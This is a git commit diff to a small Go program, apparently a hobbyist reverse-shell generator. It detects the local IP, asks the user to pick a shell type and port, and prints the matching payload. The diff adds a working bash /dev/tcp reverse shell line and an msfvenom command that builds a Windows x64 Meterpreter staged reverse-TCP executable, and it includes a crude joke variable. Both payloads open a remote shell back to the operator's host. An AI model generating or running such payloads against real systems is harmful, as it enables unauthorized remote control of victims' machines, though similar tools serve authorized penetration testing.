91ead16e949e1e6be8b2a29179ccd093f4848c6f
xn4k <stueckholz@hotmail.com>
2021-12-22 11:23:45 +0100

    implementing cases and 2 shells

--- main.go
+++ main.go
@@ -19,6 +19,13 @@ const rubyS =
 const ncS =
 }*/
 
+//@formatter:off
+
+var denis =     "penis" // i am the ugly formatter from GOland and now i am off
+						// because of this sweet comments
+
+//@formatter:on
+
 // Get preferred outbound ip of this machine
 func supply() net.IP {
 	conn, err := net.Dial("udp", "8.8.8.8:80")
@@ -30,28 +37,45 @@ func supply() net.IP {
 	fmt.Println(localAddr.IP)
 	//get local ip part is over and the lexical part begins
 	const intMessage = "Hello user, let us create so reverse shells! What we going to choose today?"
-	const listOfShells = "1. Bash Reverse Shell\nPHP Reverse Shell.\nJava Reverse Shell.\n" +
+	const listOfShells = "1. Bash Reverse Shell.\n2. Windows Meterpreter Staged Reverse TCP (x64).\n" +
+		"Java Reverse Shell.\n" +
 		"Perl Reverse Shell.\nPython Reverse Shell.\nRuby Reverse Shell.\nNetcat Reverse Shell."
 	fmt.Println(intMessage, "\n"+listOfShells)
-	fmt.Println("So what shell we going to take? ")
+	fmt.Println("So what shell we going to take?\nJust choose the right number:")
 	// var then variable name then variable type
 	var choosenS string
 	// Taking input from user
 	fmt.Scanln(&choosenS)
-	fmt.Println("you took number", choosenS, "shell\nHere is your shell, just copy it, HAPPY HACKING!")
+	fmt.Println("What Port we going to use?\nJust type the number or name:")
+	var choosenP string
+	fmt.Scanln(&choosenP)
+	//two friends dan and lens = together the autoanswer
+	var dan = "you took"
+	var lens = "shell\nHere is your shell, just copy it, HAPPY HACKING!"
+	fmt.Println(dan, choosenS, lens)
 	var ipa = localAddr.IP
-	if choosenS == "1" {
-		fmt.Print("sh -i >& /dev/tcp/", ipa, "/9001 0>&1\n")
-
+	switch choosenS {
+	case "1", "Bash Reverse Shell", "Bash", "bash":
+		fmt.Print("sh -i >& /dev/tcp/", ipa, "/", choosenP, " 0>&1\n")
+	case "2", "Windows Meterpreter Staged Reverse TCP (x64)":
+		fmt.Print("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=", ipa,
+			" LPORT=", choosenP, " -f exe -o reverse.exe\n")
 	}
+
 	return localAddr.IP
 }
 
 func a() {
+	/*switch choosenS {
+	case "1", "Bash Reverse Shell", "Bash", "Reverse", "reverse":
+		fmt.Print("sh -i >& /dev/tcp/", ipa, "/9001 0>&1\n")
+
+	}*/
 
 }
 
 func main() {
-	a()
+
 	supply()
+
 }
